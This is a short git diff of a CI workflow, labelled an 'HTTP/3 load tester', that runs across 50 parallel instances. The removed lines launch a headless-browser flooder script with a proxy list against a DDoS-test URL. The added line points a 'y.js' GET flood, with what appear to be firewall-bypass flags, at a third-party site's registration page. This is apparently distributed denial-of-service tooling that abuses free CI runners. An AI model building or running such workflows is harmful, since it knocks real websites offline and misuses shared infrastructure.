@@ -42,14 +42,7 @@ jobs:
       - name: Run HTTP/3 load tester (if Python script exists)
         run: |
           unzip Fc-main.zip
-          wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-          sudo apt install -y ./google-chrome-stable_current_amd64.deb
-          echo 'export CHROME_PATH=/usr/bin/google-chrome' >> ~/.bashrc
-          source ~/.bashrc
-
-          mv Fc-main/proxy.txt proxy.txt
-          xvfb-run -a node browser.js https://uam.dstatbot.win/x0YhClBR 700 4 4 proxy.txt --debug true --flooder true --cookies 2
-          
+          node y.js GET  https://devbest.com/register/ 200 4 90 --full --bfw --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
